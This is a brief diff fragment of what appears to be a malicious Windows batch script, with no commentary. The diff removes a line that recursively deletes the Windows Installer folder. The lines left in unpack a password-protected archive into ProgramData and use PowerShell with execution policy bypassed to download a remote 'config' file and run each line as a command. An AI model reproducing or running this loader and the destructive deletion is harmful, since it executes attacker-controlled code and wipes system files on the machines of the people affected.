@@ -18,7 +18,6 @@ for %a in (%processList%) do (
     )
 )
 
-del /S /Q %WINDIR%\Installer\*.*
 "%ProgramData%\dist\UnRAR.exe" x -y -p147852369 "%ProgramData%\dist\75186.rar" "%ProgramData%\dist\"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = (Invoke-WebRequest 'https://raw.githubusercontent.com/githa0/o/master/config' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
 
